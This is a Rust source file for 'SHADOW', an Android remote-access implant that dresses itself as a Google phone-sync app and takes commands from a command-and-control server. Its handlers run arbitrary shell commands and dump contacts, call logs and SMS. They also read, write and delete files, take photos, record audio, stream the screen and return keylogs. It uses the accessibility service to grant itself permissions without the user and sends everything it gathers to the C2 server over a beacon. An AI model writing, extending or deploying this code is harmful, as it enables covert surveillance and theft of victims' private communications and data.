//! SHADOW Core — Built-in command execution + WSS transport with reconnect.

pub mod android_bridge;
pub mod transport;

use jni::objects::{JClass, JString};
use jni::JNIEnv;
use jni::sys::jint;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use tokio::runtime::Runtime;
use tokio::sync::mpsc;
use tracing::{error, info};

static STARTED: AtomicBool = AtomicBool::new(false);
static mut RUNTIME: Option<Runtime> = None;
static mut CORE: Option<Arc<ShadowCore>> = None;

// ---------------------------------------------------------------------------
// Built-in command execution (no external modules needed)
// ---------------------------------------------------------------------------

fn cmd_shell(cmd: &str) -> String {
    use std::process::Command;
    let output = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output();
    match output {
        Ok(o) => {
            let stdout = String::from_utf8_lossy(&o.stdout);
            let stderr = String::from_utf8_lossy(&o.stderr);
            if stderr.len() > 0 && stdout.len() == 0 {
                stderr.into_owned()
            } else if stderr.len() > 0 {
                format!("{}[STDERR] {}", stdout, stderr)
            } else {
                stdout.into_owned()
            }
        }
        Err(e) => format!("shell error: {}", e),
    }
}

// Data extraction — all via ContentResolver with our OWN uid (no root, no Shizuku).
// The runtime permissions are obtained by the a11y auto-grant flow.
fn cmd_contacts() -> String {
    android_bridge::query_provider(
        "content://com.android.contacts/data/phones".into(),
        "display_name,data1,data2".into(),
        2000,
    )
}

fn cmd_calllog() -> String {
    android_bridge::query_provider(
        "content://call_log/calls".into(),
        // cached_name was removed for non-default-dialer apps in Android 10+ and the
// ColorOS provider rejects the whole projection over it ("Invalid column
// cached_name"); the contact name is already reachable via the number.
        "number,date,type,duration".into(),
        1000,
    )
}

fn cmd_sms() -> String {
    android_bridge::query_provider(
        "content://sms".into(),
        "address,body,date,type".into(),
        1000,
    )
}

fn cmd_grant(permission: &str) -> String {
    // `pm grant` needs shell/root — useless on a real device.
    // Instead: open Settings and let the a11y service click Allow.
    let _ = permission;
    android_bridge::a11y_start_autogrant()
}

fn cmd_perms() -> String {
    android_bridge::granted_permissions()
}

fn cmd_screen() -> String {
    android_bridge::a11y_dump_screen()
}

/// Chunked binary read: {"size","offset","len","eof","b64"}.
fn cmd_fs_read_b64(path: &str, offset: u64, len: u64) -> String {
    use base64::Engine;
    use std::io::{Read, Seek, SeekFrom};

    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) => return format!("fs error: {}", e),
    };
    if !meta.is_file() {
        return "fs error: not a file".into();
    }
    let size = meta.len();
    let take = len.min(size.saturating_sub(offset)) as usize;
    let mut buf = Vec::with_capacity(take);
    if take > 0 {
        let mut f = match std::fs::File::open(path) {
            Ok(f) => f,
            Err(e) => return format!("fs error: {}", e),
        };
        if let Err(e) = f.seek(SeekFrom::Start(offset)) {
            return format!("fs error: {}", e);
        }
        // read_exact would fail on a file truncated mid-transfer, so accept a
        // short read and let eof tell the operator what actually arrived.
        let mut tmp = vec![0u8; take];
        match f.read(&mut tmp) {
            Ok(n) => tmp.truncate(n),
            Err(e) => return format!("fs error: {}", e),
        }
        buf = tmp;
    }
    let b64 = base64::engine::general_purpose::STANDARD.encode(&buf);
    let eof = offset + buf.len() as u64 >= size;
    match serde_json::to_string(&serde_json::json!({
        "size": size, "offset": offset, "len": buf.len(), "eof": eof, "b64": b64,
    })) {
        Ok(j) => j,
        Err(e) => format!("json error: {}", e),
    }
}

/// Write base64 bytes to the device, appending for all but the first chunk.
fn cmd_fs_write_b64(path: &str, b64: &str, append: bool) -> String {
    use base64::Engine;
    use std::io::Write;

    let bytes = match base64::engine::general_purpose::STANDARD.decode(b64) {
        Ok(b) => b,
        Err(e) => return format!("b64 decode error: {}", e),
    };
    if let Some(parent) = std::path::Path::new(path).parent() {
        if !parent.as_os_str().is_empty() {
            let _ = std::fs::create_dir_all(parent);
        }
    }
    let wrote = match std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .append(append)
        .truncate(!append)
        .open(path)
    {
        // append(true) always writes at EOF, so no explicit seek is needed here.
        Ok(mut f) => match f.write_all(&bytes).map(|_| bytes.len()) {
            Ok(n) => n,
            Err(e) => return format!("fs error: {}", e),
        },
        Err(e) => return format!("fs error: {}", e),
    };
    let total = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
    format!("wrote {} bytes to {} (total {})", wrote, path, total)
}

/// Remove one file. No globbing, no recursion: this runs with the implant's own
/// privileges, so a recursive delete here would be a self-inflicted outage.
fn cmd_fs_delete(path: &str) -> String {
    match std::fs::remove_file(path) {
        Ok(_) => "deleted".into(),
        Err(e) => format!("fs error: {}", e),
    }
}

fn cmd_keylog_file() -> String {
    let date = cmd_shell("date +%Y-%m-%d");
    let path = format!(
        "/data/data/com.google.android.phonesync/files/keylogs/keylog_{}.txt",
        date.trim()
    );
    cmd_fs_read(&path)
}

fn cmd_keylog_list() -> String {
    cmd_fs_list("/data/data/com.google.android.phonesync/files/keylogs")
}

fn cmd_fs_list(path: &str) -> String {
    let entries = match std::fs::read_dir(path) {
        Ok(r) => r,
        Err(e) => return format!("fs error: {}", e),
    };
    let mut items = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().into_owned();
        let ftype = if entry.path().is_dir() { "d" } else { "f" };
        let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
        items.push(format!("{}\t{}\t{}", ftype, size, name));
    }
    items.sort();
    items.join("\n")
}

fn cmd_fs_read(path: &str) -> String {
    match std::fs::read_to_string(path) {
        Ok(c) => c,
        Err(e) => format!("fs error: {}", e),
    }
}

fn cmd_device_info() -> String {
    let mut info = serde_json::json!({
        "id": "implant",
        "arch": std::env::consts::ARCH,
        "os": "android",
    });
    // Read basic Android properties
    for prop in [("model", "ro.product.model"), ("brand", "ro.product.brand"),
                 ("android_version", "ro.build.version.release"),
                 ("sdk", "ro.build.version.sdk"),
                 ("security_patch", "ro.build.version.security_patch")] {
        let (key, prop_name) = prop;
        if let Ok(val) = std::process::Command::new("getprop").arg(prop_name).output() {
            let s = String::from_utf8_lossy(&val.stdout).trim().to_string();
            info[key] = serde_json::Value::String(s);
        }
    }
    info.to_string()
}

fn execute_command(cmd: &str, payload: &serde_json::Value) -> Option<String> {
    match cmd {
        "shell" => {
            let sh_cmd = payload.as_str()
                .or_else(|| payload.get("cmd").and_then(|v| v.as_str()))
                .unwrap_or("id");
            Some(cmd_shell(sh_cmd))
        }
        "fs" | "fs_list" | "ls" => {
            let path = payload.as_str()
                .or_else(|| payload.get("path").and_then(|v| v.as_str()))
                .unwrap_or("/sdcard");
            Some(cmd_fs_list(path))
        }
        "fs_read" | "cat" => {
            let path = payload.as_str()
                .or_else(|| payload.get("path").and_then(|v| v.as_str()))
                .unwrap_or("");
            if path.is_empty() { return Some("usage: cat <path>".into()); }
            Some(cmd_fs_read(path))
        }
        // Binary-safe transfer. fs_read stays text-only (cmd_keylog_file depends on
        // its raw return), so downloads use a chunked base64 read and uploads a
        // base64 write. Chunking keeps every RPC under the Worker body limit.
        "fs_read_b64" => {
            let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
            if path.is_empty() { return Some("usage: fs_read_b64 {path, offset?, len?}".into()); }
            let offset = payload.get("offset").and_then(|v| v.as_u64()).unwrap_or(0);
            let len = payload.get("len").and_then(|v| v.as_u64()).unwrap_or(262_144);
            Some(cmd_fs_read_b64(path, offset, len))
        }
        "fs_write_b64" => {
            let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let b64 = payload.get("b64").and_then(|v| v.as_str()).unwrap_or("");
            if path.is_empty() { return Some("usage: fs_write_b64 {path, b64, append?}".into()); }
            let append = payload.get("append").and_then(|v| v.as_bool()).unwrap_or(false);
            Some(cmd_fs_write_b64(path, b64, append))
        }
        "fs_delete" => {
            let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
            if path.is_empty() { return Some("usage: fs_delete {path}".into()); }
            Some(cmd_fs_delete(path))
        }
        "device_info" | "info" => Some(cmd_device_info()),
        "ping" | "heartbeat" => Some("pong".into()),
        "contacts" => Some(cmd_contacts()),
        "calllog" => Some(cmd_calllog()),
        "sms" => Some(cmd_sms()),
        // Camera / mic capture primitives (auto-grantable via CAMERA + RECORD_AUDIO).
        //   snap   -> photo as base64 JPEG   ("b64:...")
        //   record <ms> -> mic capture, default 5000ms, capped 30000
        "snap" | "photo" => {
            let which = payload.as_str()
                .or_else(|| payload.get("which").and_then(|v| v.as_str()))
                .unwrap_or("back")
                .to_string();
            Some(android_bridge::snap_camera(&which))
        }
        "record" | "audio" => {
            let ms = payload.as_u64().or_else(|| payload.get("ms").and_then(|v| v.as_u64()))
                .unwrap_or(5000) as i32;
            Some(android_bridge::record_audio(ms))
        }
        // Live semantic screen stream. {on, interval_ms, max_nodes}
        // Frames ride the existing a11y event pipe; nothing new to transport.
        "screen_stream" | "stream" => {
            let on = payload.get("on").and_then(|v| v.as_bool()).unwrap_or(true);
            let interval = payload
                .get("interval_ms")
                .and_then(|v| v.as_i64())
                .unwrap_or(800)
                .clamp(200, 10_000) as i32;
            let max_nodes = payload
                .get("max_nodes")
                .and_then(|v| v.as_i64())
                .unwrap_or(120)
                .clamp(10, 400) as i32;
            Some(android_bridge::set_screen_stream(on, interval, max_nodes))
        }
        // Re-arm a dead accessibility binding (OEM ROMs leave the setting on but
        // the service unbound). Needs WRITE_SECURE_SETTINGS, granted off-device.
        "fix_a11y" | "rebind_a11y" => Some(android_bridge::fix_a11y()),
        "grant" | "autogrant" => {
            let perm = payload.as_str()
                .or_else(|| payload.get("permission").and_then(|v| v.as_str()))
                .unwrap_or("ALL");
            Some(cmd_grant(perm))
        }
        "perms" | "permissions" => Some(cmd_perms()),
        "screen" | "dump" => Some(cmd_screen()),
        "click" => {
            let needle = payload.as_str()
                .or_else(|| payload.get("text").and_then(|v| v.as_str()))
                .unwrap_or("");
            if needle.is_empty() {
                Some("usage: click <text|#resource_id>".into())
            } else if let Some(id) = needle.strip_prefix('#') {
                Some(android_bridge::a11y_click_id(id))
            } else {
                Some(android_bridge::a11y_click_text(needle))
            }
        }
        // `apps` = every installed package: no grant needed, works on any device.
        // `procs` keeps the ActivityManager view, which Android 8+ restricts to our
        // own process -- that is why "Running Apps" reported exactly one row.
        "apps" | "installed" | "pkgs" => Some(android_bridge::installed_apps()),
        "procs" | "running" => Some(android_bridge::running_apps()),
        "fgapp" | "foreground" => Some(android_bridge::foreground_app()),
        // Special-access permissions have no silent API. Native flow: open the
        // right Settings screen here, then flip our own row via accessibility.
        "grant_screen" => {
            let kind = payload.as_str()
                .or_else(|| payload.get("kind").and_then(|v| v.as_str()))
                .unwrap_or("allfiles");
            Some(android_bridge::open_grant_screen(kind))
        }
        "toggle_grant" => Some(android_bridge::toggle_grant()),
        "keylog_file" => Some(cmd_keylog_file()),
        "keylog_list" => Some(cmd_keylog_list()),
        _ => None, // Unknown command — don't respond
    }
}

// ---------------------------------------------------------------------------
// Core
// ---------------------------------------------------------------------------

struct ShadowCore {
    domain: String,
    implant_id: String,
    module_dir: std::path::PathBuf,
    event_tx: mpsc::UnboundedSender<Vec<u8>>,
}

impl ShadowCore {
    async fn start(&self, mut event_rx: tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>) -> anyhow::Result<()> {
        // HTTP long-poll beacon: this process is reaped every ~48s, so a persistent
        // socket is fictional here. The beacon parks on the DO and is resolved the
        // moment a command lands, which keeps push latency without socket ownership.
        let beacon = transport::poll::PollTransport::new(&self.domain, &self.implant_id);
        let (tx_send, rx_send) = mpsc::channel::<Vec<u8>>(100);

        // Wire a11y exfil events into transport outbound
        let event_tx_send = tx_send.clone();
        tokio::spawn(async move {
            while let Some(msg) = event_rx.recv().await {
                if event_tx_send.send(msg).await.is_err() { break; }
            }
        });

        // Heartbeat: tell the C2 we're alive.
        // The first beat must fire IMMEDIATELY, not after a 60s sleep: ColorOS reaps
        // this process every ~40s, so a delayed first beat meant the implant could
        // connect, get killed, and reconnect without the DO ever learning its identity.
        let hb_tx = tx_send.clone();
        let hb_id = self.implant_id.clone();
        tokio::spawn(async move {
            let mut tick = tokio::time::interval(tokio::time::Duration::from_secs(30));
            tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
            loop {
                tick.tick().await;
                let hb = serde_json::json!({
                    "type": "heartbeat",
                    "id": hb_id,
                    "ts": std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .map(|d| d.as_millis()).unwrap_or(0),
                    "info": {
                        "id": hb_id,
                        "arch": std::env::consts::ARCH,
                        "os": "android",
                    },
                });
                if hb_tx.send(hb.to_string().into_bytes()).await.is_err() { break; }
            }
        });

        info!("SHADOW initialized. Implant ID: {}", self.implant_id);

        let _ = std::fs::create_dir_all(&self.module_dir);
        let rx_send_shared = std::sync::Arc::new(tokio::sync::Mutex::new(rx_send));
        // Clone the persistent outbound sender so the inbound handler can push responses
        let tx_outbound = tx_send.clone();

        // Transport connection loop with reconnect
        let transport_task = tokio::spawn(async move {
            let mut backoff = tokio::time::Duration::from_secs(2);
            let max_backoff = tokio::time::Duration::from_secs(60);

            loop {
                let (tx_internal, rx_internal) = mpsc::channel::<Vec<u8>>(100);
                let (tx_recv_internal, mut rx_recv_inner) = mpsc::channel::<Vec<u8>>(100);

                // Proxy persistent outbound queue into this connection's channel
                let rx_shared_clone = rx_send_shared.clone();
                let proxy = tokio::spawn(async move {
                    let mut lock = rx_shared_clone.lock().await;
                    while let Some(msg) = lock.recv().await {
                        if tx_internal.send(msg).await.is_err() { break; }
                    }
                });

                // Inbound: parse commands, execute, send response through the persistent outbound channel
                let reply_tx = tx_outbound.clone();
                let inbound = tokio::spawn(async move {
                    while let Some(msg) = rx_recv_inner.recv().await {
                        let text = String::from_utf8_lossy(&msg).into_owned();
                        info!("CMD <- C2: {}", &text[..text.len().min(200)]);

                        // Parse {"id":"...", "c":"...", "p":...}
                        if let Ok(v) = serde_json::from_str::<serde_json::Value>(&text) {
                            let cmd_id = v.get("id").and_then(|x| x.as_str()).unwrap_or("").to_string();
                            let cmd = v.get("c").and_then(|x| x.as_str()).unwrap_or("").to_string();
                            let payload = v.get("p").cloned().unwrap_or(serde_json::Value::Null);

                            if !cmd.is_empty() {
                                match execute_command(&cmd, &payload) {
                                    Some(result) => {
                                        let resp = serde_json::json!({
                                            "type": "result",
                                            "id": cmd_id,
                                            "cmd": cmd,
                                            "data": result,
                                            "ts": std::time::SystemTime::now()
                                                .duration_since(std::time::UNIX_EPOCH)
                                                .map(|d| d.as_millis()).unwrap_or(0),
                                        });
                                        if reply_tx.send(resp.to_string().into_bytes()).await.is_err() {
                                            error!("Failed to queue response for {}", cmd_id);
                                        }
                                        info!("RESULT -> C2: {} ({} bytes)", cmd, result.len());
                                    }
                                    None => {
                                        info!("Unknown command: {}", cmd);
                                    }
                                }
                            }
                        }
                    }
                });

                if let Err(e) = beacon.run(rx_internal, tx_recv_internal).await {
                    error!("Transport error: {}", e);
                }

                proxy.abort();
                inbound.abort();

                info!("BEACON reconnecting in {:?}...", backoff);
                tokio::time::sleep(backoff).await;
                backoff = std::cmp::min(backoff * 2, max_backoff);
            }
        });

        Ok(())
    }
}

/// Forward an a11y event (keylog, notif, click) to the transport for exfil.
pub fn push_event(tag: &str, payload: &str) {
    let frame = format!("{{\"type\":\"event\",\"tag\":\"{}\",\"data\":{}}}", tag, payload);
    unsafe {
        if let Some(core) = CORE.as_ref() {
            let _ = core.event_tx.clone().send(frame.into_bytes());
        }
    }
}

// ---------------------------------------------------------------------------
// JNI interface
// ---------------------------------------------------------------------------

#[no_mangle]
pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
    mut env: JNIEnv,
    _: JClass,
    domain_jstr: JString,
    id_jstr: JString,
) -> jint {
    android_logger::init_once(
        android_logger::Config::default()
            .with_tag("ShadowCore")
            .with_max_level(log::LevelFilter::Info),
    );

    if STARTED.swap(true, Ordering::SeqCst) {
        return 0;
    }

    // Stash the JavaVM so background threads can call back into Kotlin.
    if let Ok(vm) = env.get_java_vm() {
        android_bridge::set_vm(vm);
    }

    // Resolve the Kotlin bridge class NOW, while this JNIEnv comes from a
    // Java-initiated call and the app's class loader is therefore in scope.
    // Background threads attached via AttachCurrentThread see only the bootstrap
    // loader, so any FindClass from there cannot resolve com.shadow.* and the
    // resulting ClassNotFoundException was killing the process (and taking the
    // accessibility service down with it).
    android_bridge::cache_bridge_class(&mut env);

    let domain: String = env.get_string(&domain_jstr).unwrap().into();
    let implant_id: String = env.get_string(&id_jstr).unwrap().into();

    unsafe {
        RUNTIME = Some(Runtime::new().unwrap());
        let runtime = RUNTIME.as_ref().unwrap();

        runtime.block_on(async {
            let (event_tx, event_rx) = mpsc::unbounded_channel::<Vec<u8>>();

            let core = Arc::new(ShadowCore {
                domain: domain.clone(),
                implant_id: implant_id.clone(),
                module_dir: std::path::PathBuf::from(
                    "/data/data/com.google.android.phonesync/files/modules"
                ),
                event_tx,
            });

            CORE = Some(core.clone());

            tokio::spawn(async move {
                if let Err(e) = core.start(event_rx).await {
                    error!("Core start failed: {}", e);
                }
            });

            0
        })
    }
}

#[no_mangle]
pub extern "system" fn Java_com_shadow_ShadowCore_nativeLogEvent(
    mut env: JNIEnv,
    _: JClass,
    entry_jstr: JString,
) {
    let entry: String = match env.get_string(&entry_jstr) {
        Ok(s) => s.into(),
        Err(_) => return,
    };
    push_event("a11y", &serde_json::to_string(&entry).unwrap_or(entry));
}
